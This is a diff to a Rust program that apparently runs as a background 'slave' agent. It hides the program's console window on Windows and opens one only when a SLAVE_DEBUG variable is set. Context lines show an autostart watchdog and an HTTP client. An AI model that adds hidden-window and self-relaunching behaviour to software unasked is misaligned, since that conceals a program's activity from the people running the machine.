@@ -1,3 +1,5 @@
+#![cfg_attr(windows, windows_subsystem = "windows")]
+
 use anyhow::{Context, Result};
 use auto_launch::{AutoLaunch, AutoLaunchBuilder, WindowsEnableMode};
 use maple_rs::Maple;
@@ -26,6 +28,7 @@ struct VirusResult {
 
 #[tokio::main]
 async fn main() -> Result<()> {
+    debug_console();
     let client = reqwest::Client::new();
     tokio::spawn(autostart_watchdog());
 
@@ -195,3 +198,17 @@ fn local_ip() -> String {
         .map(|addr| addr.ip().to_string())
         .unwrap_or_else(|_| "unknown".to_owned())
 }
+
+#[cfg(windows)]
+fn debug_console() {
+    use windows_sys::Win32::System::Console;
+    if std::env::var("SLAVE_DEBUG").is_err() {
+        return;
+    }
+    unsafe {
+        Console::AllocConsole();
+    }
+}
+
+#[cfg(not(windows))]
+fn debug_console() {}
